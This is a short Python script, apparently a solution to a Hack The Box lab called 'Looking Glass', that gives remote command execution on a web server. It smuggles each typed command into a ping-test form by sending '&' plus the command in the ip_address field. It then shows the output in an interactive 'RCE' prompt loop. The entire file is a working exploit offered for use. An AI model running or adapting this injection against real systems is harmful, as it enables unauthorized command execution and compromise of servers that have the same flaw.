from termcolor import colored
from bs4 import BeautifulSoup
import requests
import sys

def parse(res):
    soup = BeautifulSoup(res, "html5lib")
    return soup.find_all("textarea")[0].get_text()

def runCmd(url, cmd):
    data = {
            "test": "ping",
            "ip_address": "&"+cmd,
            "submit": "Test"
            }
    res = requests.post(url, data=data)
    return parse(res.content)

if __name__ == "__main__":

    banner = """
---------------------------------------------------
|         Looking Glass [HTB]  RCE script         |
|       Coded By - Nehal Zaman (@pwnersec).       |
---------------------------------------------------\n\n
    """

    print(colored(banner, "yellow"))

    if len(sys.argv) != 2:
        print(f"USAGE: {sys.argv[0]} <url>")
        sys.exit(1)

    url = sys.argv[1]
    cmd = "dummy"
    while cmd != "":
        cmd = input(colored("[ RCE ] > ", "green"))
        if cmd != "":
            print(colored(runCmd(url, cmd), "blue"))

    print(colored("Exiting pseudo-console", "red"))
